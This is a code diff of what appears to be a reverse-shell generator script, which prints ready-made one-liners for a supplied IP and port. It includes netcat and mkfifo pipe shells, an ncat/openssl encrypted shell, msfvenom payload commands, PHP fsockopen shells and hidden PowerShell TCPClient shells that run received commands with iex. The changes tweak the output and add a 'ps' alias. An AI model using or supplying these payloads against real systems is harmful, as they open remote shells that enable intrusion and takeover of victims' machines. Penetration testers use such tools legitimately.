@@ -21,9 +21,9 @@ def return_shells(shell, ip, port):
 			print_shell("NetCat")
 			nc =bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" nc -e /bin/sh """+ip+""" """+port
 			nc2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
-			ncatssl = bcolors.YELLOW + """[3]"""+bcolors.ENDC+""" ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
-			nc3 = bcolors.YELLOW + """[4]"""+bcolors.ENDC+"""touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc """+ip+""" """+port+""" > /tmp/f"""
-			print(nc);print(nc2);print(ncatssl)
+			ncatssl = bcolors.YELLOW + """[3]"""+bcolors.ENDC+""" ncat --ssl -vv -l -p """+port+"""; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
+			nc3 = bcolors.YELLOW + """[4]"""+bcolors.ENDC+""" touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc """+ip+""" """+port+""" > /tmp/f"""
+			print(nc);print(nc2);print(ncatssl);print(nc3)
 		elif shell == "msfvenom":
 			print_shell("MSFVenom")
 			lin_sl = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
@@ -38,7 +38,7 @@ def return_shells(shell, ip, port):
 			php = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
 			php2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
 			print(php);print(php2)
-		elif shell == "powershell":
+		elif shell == "powershell" or shell == "ps":
 			print_shell("Powershell")
 			powershell1 = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
 			powershell2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
